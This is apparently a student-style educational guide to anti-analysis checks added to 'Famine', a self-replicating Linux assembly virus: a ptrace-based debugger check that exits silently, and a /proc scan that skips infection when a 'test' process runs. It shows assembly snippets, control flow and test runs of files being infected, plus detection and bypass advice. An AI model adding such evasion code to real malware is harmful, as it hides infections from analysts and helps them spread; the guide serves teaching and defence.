# Security Checks Implementation - Educational Guide

## Overview

This document explains the security mechanisms added to the Famine virus to prevent infection under specific conditions. These additions demonstrate common anti-analysis and environmental detection techniques used in real-world malware.

## Requirements Implemented

The virus now includes two security checks:
1. **Anti-Debugger Detection**: The program exits immediately if run under a debugger (e.g., gdb)
2. **Process Detection**: The program skips infection if a process named "test" is currently running

## Where the Changes Were Made

### 1. New File: `sources/security_checks.s`

This file contains all the security check functions and their helper routines:
- `check_debugger()` - Detects debugger presence
- `check_process_running()` - Scans for the "test" process
- Helper functions for string manipulation and comparison

**Why a separate file?**
- **Modularity**: Keeps security logic separate from main infection code
- **Reusability**: These checks can be easily maintained or removed
- **Clarity**: Makes the codebase easier to understand for educational purposes

### 2. Modified: `sources/main.s`

Added security checks at two critical points:

#### a) At `_start` (Line ~46-53)
```assembly
_start:
    ; SECURITY CHECK 1: Anti-Debugger Detection
    call check_debugger
    test rax, rax
    jnz .exit_silently          ; If debugger detected, exit
    
    ; ... rest of initialization
```

**Why here?**
- This is the **very first code executed** when the program starts
- Runs BEFORE any registers are saved or infection begins
- Ensures the virus never executes ANY payload if debugged
- Applies to both original Famine binary AND infected binaries

#### b) Before Infection in Original Binary Path (Line ~74-81)
```assembly
    ; SECURITY CHECK 2: Check for "test" Process
    call check_process_running
    test rax, rax
    jnz .skip_infection         ; If "test" process running, skip
    
    mov qword [rel file_count], 0
    ; ... proceed with infection
```

**Why here?**
- Executed AFTER debugger check but BEFORE file enumeration
- Prevents wasting resources scanning files if we won't infect
- In the original Famine execution path (not infected binary)

#### c) In Virus Payload Execution Path (Line ~119-121)
```assembly
.run_as_virus:
    ; SECURITY CHECK 2: Check for "test" Process
    call check_process_running
    test rax, rax
    jnz .virus_skip_infection   ; Skip to original entry
```

**Why here?**
- When an infected binary runs, its virus payload also checks
- Prevents further spreading even from already-infected binaries
- Jumps directly to original program if "test" is running

### 3. Modified: `includes/include.s`

Added necessary system call and constant definitions:
- `SYS_PTRACE` (syscall #101) - For debugger detection
- `AT_FDCWD` (-100) - For opening files relative to current directory
- `O_RDONLY` (0) - For reading files and directories

## How Debugger Detection Works

### The `ptrace` System Call

The `check_debugger` function uses the Linux `ptrace` syscall, which is the foundation for debugging:

```assembly
check_debugger:
    mov eax, SYS_PTRACE         ; syscall number 101
    mov edi, PTRACE_TRACEME     ; request = PTRACE_TRACEME (0)
    xor esi, esi                ; pid = 0
    xor edx, edx                ; addr = 0
    xor r10d, r10d              ; data = 0
    syscall
```

### How It Detects Debuggers

**The `PTRACE_TRACEME` Request:**
- Asks the kernel: "Can a parent process trace me?"
- A process can only have ONE tracer at a time

**Return Values:**
- **0 (success)**: No debugger attached, syscall succeeded
- **-1 (EPERM)**: A debugger is ALREADY attached!

**Why this works:**
- When you run `gdb ./Famine`, gdb uses `ptrace(PTRACE_ATTACH)` to attach
- Our code then calls `ptrace(PTRACE_TRACEME)`
- The kernel rejects it because gdb is already the tracer
- We detect this rejection and exit immediately

### Real-World Example

```bash
# Without debugger:
$ ./Famine
# ptrace returns 0, continues normally, infects files

# With debugger:
$ gdb ./Famine
(gdb) run
# ptrace returns -1, program exits silently immediately
```

### Limitations

This technique has some limitations:
1. **Timing window**: Must be called early before debugger can intercept
2. **Can be bypassed**: Advanced debuggers can catch and fake the syscall return
3. **Detectable**: Security tools can see this suspicious ptrace usage

## How Process Detection Works

### Scanning the `/proc` Filesystem

Linux exposes running processes through `/proc/[PID]/` directories. Each process has:
- `/proc/[PID]/comm` - Contains the process name (15 chars max + newline)
- `/proc/[PID]/` - Directory name is the process ID

### The Algorithm

The `check_process_running` function follows these steps:

```
1. Open /proc directory
   ├─ Use openat() with O_DIRECTORY flag
   └─ Returns file descriptor for reading entries

2. Read directory entries with getdents64()
   ├─ Gets bulk listing of /proc entries
   ├─ Each entry contains: d_ino, d_off, d_reclen, d_type, d_name
   └─ d_name is the PID (or ".", "..", "cpuinfo", etc.)

3. For each entry:
   ├─ Skip "." and ".."
   ├─ Check if d_name is numeric (is it a PID?)
   ├─ If yes, build path: /proc/[PID]/comm
   ├─ Open and read the comm file
   ├─ Compare first 4 bytes with "test"
   └─ If match found, return 1 (detected)

4. Return 0 if not found after scanning all processes
```

### Implementation Details

**Why `/proc/PID/comm`?**
- Simple, one-line file containing process name
- Always present for every process
- Fast to read (usually ~10-20 bytes)

**Why check only first 4 bytes?**
- Process name "test" followed by newline: `"test\n"`
- We compare: `str1[0:4]` == `"test"`
- This matches "test\n" in the comm file

**Memory Layout on Stack:**
```
rbp - 4352: path buffer ("/proc/1234/comm")
rbp - 4300: process name buffer (read from comm file)
rbp - 4224: getdents64 buffer (directory entries)
rbp - 8:    local variables
```

### Code Walkthrough

```assembly
check_process_running:
    ; Allocate 4352 bytes of stack space for buffers
    sub rsp, 4352
    
    ; Open /proc directory
    mov eax, SYS_OPENAT
    lea rsi, [rel sec_proc_dir_path]  ; "/proc/"
    mov edx, O_RDONLY | O_DIRECTORY
    syscall
    
.read_proc_loop:
    ; Read batch of directory entries
    mov eax, SYS_GETDENTS64
    lea rsi, [rbp-4224]    ; buffer
    mov edx, 4096          ; buffer size
    syscall
    
    ; For each entry:
    ;   - Check if numeric (is_numeric)
    ;   - Build path: /proc/[PID]/comm
    ;   - Read and compare with "test"
    
    ; If found: return 1
    ; If not found: return 0
```

### Real-World Test

```bash
# Start a process named "test"
$ /usr/local/bin/test &
[1] 1234

# Verify its name in /proc
$ cat /proc/1234/comm
test

# Run Famine - it will detect and skip infection
$ ./Famine
This is the end my friend, my only friend the end
# Notice: no "infected" messages!

# Kill the test process
$ kill 1234

# Run Famine again - now it infects
$ ./Famine
/tmp/test/file.txt
infected /tmp/test/file.txt
This is the end my friend, my only friend the end
```

## Control Flow Diagram

```
┌─────────────────────────────────────────────────────────┐
│                     _start                              │
└────────────────────┬────────────────────────────────────┘
                     │
                     ▼
          ┌──────────────────────┐
          │  check_debugger()    │
          │  Uses ptrace syscall │
          └──────────┬───────────┘
                     │
        ┌────────────┴────────────┐
        │                         │
        ▼ rax=0                   ▼ rax=1
   No debugger              Debugger detected!
        │                         │
        │                         ▼
        │                  .exit_silently:
        │                   sys_exit(0)
        │                         
        ▼
   Save registers
   Get base address
        │
        ▼
   ┌──────────────────────────┐
   │ Original entry == 0?     │
   └────┬─────────────────┬───┘
        │                 │
        ▼ YES             ▼ NO
  Original Famine    Virus payload
  execution path     in infected binary
        │                 │
        ▼                 ▼
  check_process_     check_process_
  running()          running()
        │                 │
  ┌─────┴─────┐     ┌─────┴─────┐
  │           │     │           │
  ▼ found     ▼ not ▼ found     ▼ not
Skip      Infect  Skip to    Infect &
infection files   original   continue
  │           │   entry      to original
  │           │     │        │
  └───┬───────┘     └────┬───┘
      │                  │
      ▼                  ▼
     _end          Jump to original
                   entry point
```

## Educational Takeaways

### For Students

1. **System Call Knowledge**: Understanding how programs interact with the kernel
   - `ptrace` for debugging
   - `openat`, `getdents64` for filesystem operations
   - Direct syscalls vs. library functions

2. **Process Introspection**: How Linux exposes process information
   - `/proc` filesystem structure
   - Process naming and identification
   - Reading process metadata

3. **Assembly Programming**: Real-world x86-64 assembly patterns
   - Stack frame management
   - Syscall invocation
   - Position-independent code (`[rel label]`)
   - Function calling conventions

4. **Anti-Analysis Techniques**: Common malware detection avoidance
   - Early debugger checks
   - Environmental awareness
   - Graceful failure (silent exit)

### Defensive Perspective

**As a security professional, you should:**

1. **Detect these patterns:**
   - Suspicious early `ptrace` calls
   - Scanning `/proc` for specific processes
   - Programs that behave differently under debugging

2. **Bypass these checks:**
   - LD_PRELOAD to hook syscalls
   - Kernel-level debugging (KDB, KGDB)
   - Virtual machine introspection
   - Binary patching to NOP the checks

3. **Prevent these techniques:**
   - Mandatory kernel instrumentation (eBPF)
   - Secure boot and signed binaries
   - Behavioral analysis in sandboxes
   - Static analysis for detection

## Testing the Implementation

### Test 1: Normal Execution
```bash
$ ./Famine
/tmp/test/file.txt
infected /tmp/test/file.txt
This is the end my friend, my only friend the end
```
✅ **Result**: Files are infected normally

### Test 2: Under Debugger
```bash
$ gdb ./Famine
(gdb) run
[Inferior 1 (process 1234) exited normally]
```
✅ **Result**: Program exits immediately, silently

### Test 3: With "test" Process Running
```bash
$ /usr/local/bin/test &
[1] 5678
$ ./Famine
This is the end my friend, my only friend the end
$ ls /tmp/test/
file.txt  # Original, not infected!
```
✅ **Result**: No infection occurs, program exits gracefully

### Test 4: After Killing "test" Process
```bash
$ kill 5678
$ ./Famine
/tmp/test/file.txt
infected /tmp/test/file.txt
This is the end my friend, my only friend the end
```
✅ **Result**: Normal infection resumes

## Summary

The security checks were strategically placed:
- **Anti-debugger**: At the very beginning of `_start`, before ANY other code
- **Process check**: Before file enumeration, in both original and virus paths

These techniques demonstrate:
- How malware evades analysis tools
- How programs can be environment-aware
- The power and flexibility of Linux syscalls
- Real-world assembly programming patterns

Understanding these mechanisms helps security professionals:
- Recognize evasion techniques in malware
- Develop better detection and analysis tools
- Build more robust security systems

---

*This implementation is for educational purposes only to teach cybersecurity concepts.*
